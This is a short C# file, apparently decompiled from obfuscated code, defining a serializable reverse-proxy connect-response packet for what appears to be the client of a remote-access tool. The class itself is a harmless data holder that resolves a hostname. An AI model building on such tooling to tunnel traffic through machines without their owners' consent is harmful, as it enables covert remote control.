using System;
using System.Net;

namespace xClient.Core.ReverseProxy.Packets;

[Serializable]
public class ReverseProxyConnectResponse : GInterface4
{
	public int ConnectionId { get; set; }

	public bool IsConnected { get; set; }

	private IPAddress LocalAddress { get; set; }

	public int LocalPort { get; set; }

	public string HostName { get; set; }

	public ReverseProxyConnectResponse(int connectionId, bool isConnected, IPAddress localAddress, int localPort, string targetServer)
	{
		ConnectionId = connectionId;
		IsConnected = isConnected;
		LocalAddress = localAddress;
		LocalPort = localPort;
		HostName = "";
		if (!isConnected)
		{
			return;
		}
		try
		{
			IPHostEntry hostEntry = Dns.GetHostEntry(targetServer);
			if (hostEntry != null && !string.IsNullOrEmpty(hostEntry.HostName))
			{
				HostName = hostEntry.HostName;
			}
		}
		catch
		{
			HostName = "";
		}
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
